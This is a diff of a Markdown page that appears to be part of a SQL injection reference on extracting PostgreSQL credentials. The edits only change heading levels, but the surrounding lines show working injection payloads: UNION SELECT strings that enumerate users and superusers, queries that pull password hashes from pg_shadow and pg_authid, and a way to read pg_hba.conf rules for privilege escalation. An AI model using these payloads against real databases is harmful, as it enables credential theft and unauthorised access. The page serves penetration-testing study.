@@ -7,11 +7,9 @@ tags: ["credentials", "authentication", "user data"]
 lastUpdated: 2025-12-07
 ---
 
-## Database Credentials
-
 When performing SQL injection attacks against PostgreSQL, extracting database credentials can provide valuable information for further exploitation.
 
-### Current User Information
+## Current User Information
 
 | Information     | Query                                                        |
 | --------------- | ------------------------------------------------------------ |
@@ -20,7 +18,7 @@ When performing SQL injection attacks against PostgreSQL, extracting database cr
 | Session User    | `SELECT session_user;`                                       |
 | Superuser Check | `SELECT usesuper FROM pg_user WHERE usename = current_user;` |
 
-### User Enumeration
+## User Enumeration
 
 ```sql
 -- List all database users
@@ -37,7 +35,7 @@ SELECT usename, usecreatedb, usesuper FROM pg_user;             -- PostgreSQL 10
 SELECT usename FROM pg_user WHERE usesuper = true;
 ```
 
-### Password Hashes
+## Password Hashes
 
 PostgreSQL stores password hashes in the `pg_shadow` table (requires superuser):
 
@@ -51,7 +49,7 @@ The hash format depends on PostgreSQL version and configuration:
 - `md5` + MD5 hash (older default)
 - `SCRAM-SHA-256` hash (PostgreSQL 10+ default)
 
-### Role and Privilege Information
+## Role and Privilege Information
 
 ```sql
 -- Get role memberships
@@ -67,7 +65,7 @@ SELECT grantee, role_name
 FROM information_schema.applicable_roles;
 ```
 
-### Injection Examples
+## Injection Examples
 
 ```sql
 -- Get current user
@@ -86,7 +84,7 @@ FROM information_schema.applicable_roles;
 ' UNION SELECT NULL,string_agg(usename,','),NULL FROM pg_user WHERE usesuper=true--
 ```
 
-### Database Authentication Settings
+## Database Authentication Settings
 
 ```sql
 -- Check authentication method (pg_hba.conf)
@@ -94,7 +92,7 @@ FROM information_schema.applicable_roles;
 SELECT current_setting('hba_file');
 ```
 
-### pg_hba.conf Analysis
+## pg_hba.conf Analysis
 
 The `pg_hba.conf` file controls PostgreSQL authentication. Understanding it is critical for privilege escalation.
 
@@ -196,7 +194,7 @@ SELECT * FROM pg_hba_file_rules WHERE user_name = '{all}';
 ' UNION SELECT 1, string_agg(DISTINCT auth_method, ','), 3 FROM pg_hba_file_rules--
 ```
 
-### Password Authentication Details
+## Password Authentication Details
 
 **Password Storage in pg_authid:**
 
@@ -229,7 +227,7 @@ SELECT rolname, rolpassword IS NOT NULL as has_password
 FROM pg_authid WHERE rolcanlogin;
 ```
 
-### Connection String Extraction
+## Connection String Extraction
 
 If you find credentials, test them with connection strings:
 
@@ -245,7 +243,7 @@ CREATE USER MAPPING FOR current_user SERVER target
 OPTIONS (user 'admin', password 'secret');
 ```
 
-### Notes
+## Notes
 
 - `pg_shadow` requires superuser privileges to access
 - `pg_user` is accessible but doesn't contain password hashes
